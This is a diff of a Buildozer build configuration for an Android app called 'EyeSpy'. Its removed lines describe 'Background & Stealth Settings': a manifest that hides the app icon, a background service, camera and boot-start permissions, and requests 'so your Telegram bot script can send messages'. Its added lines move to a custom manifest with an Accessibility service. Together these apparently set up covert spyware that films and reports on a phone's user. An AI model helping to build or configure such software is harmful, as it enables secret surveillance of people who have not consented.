@@ -7,49 +7,40 @@ title = EyeSpy
 package.name = eyespy
 
 # (str) Package domain (needed for android packaging)
-package.domain = org.eyespy
+package.domain = org.eyespyservice
 
-# (str) Source files where the *.py may be found
-source.dir = .
-
-# (list) Source files to include (let it catch python files, keys, etc.)
+# (list) Source files to include (let it include python, images, xml, etc.)
 source.include_exts = py,png,jpg,kv,atlas,xml
 
-# (str) Application versioning
-version = 0.1
+# (list) Source directories containing Java files to compile
+android.add_src = src
 
-# (list) Application requirements
-# Added 'requests' so your Telegram bot script can send messages!
-requirements = python3,kivy,openssl,requests,urllib3,idna,charset-normalizer,certifi
+# (str) Application requirements
+# Add your Python dependencies here (e.g., python3, kivy)
+requirements = python3,kivy
 
 # (str) Supported orientations
 orientation = portrait
 
 # (list) Permissions
-android.permissions = CAMERA,INTERNET,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE
+# (The Accessibility service permission is handled in your manifest)
+android.permissions = INTERNET, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE
+
+# (str) Customized manifest file
+android.manifest = android_manifest.xml
 
 # (int) Target Android API, should be as high as possible.
 android.api = 33
 
-# (int) Minimum API your APK will support
+# (int) Minimum API your APK will support.
 android.minapi = 21
 
-# (bool) Indicate if you accept the SDK license
-android.accept_sdk_license = True
-
-# (list) Arctitectures - set to universal so it works on all devices
+# (str) Android arch to build for
 android.archs = arm64-v8a, armeabi-v7a
-
-# --- Background & Stealth Settings ---
-# Registers your background script
-services = eyespy_service:service.py
-
-# Points to your custom manifest that hides the app icon
-android.manifest_template = android_manifest.xml
 
 [buildozer]
 
-# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
+# (int) Log level (0 = error, 1 = info, 2 = debug)
 log_level = 2
 
 # (int) Display warning if buildozer is run as root (0 = False, 1 = True)
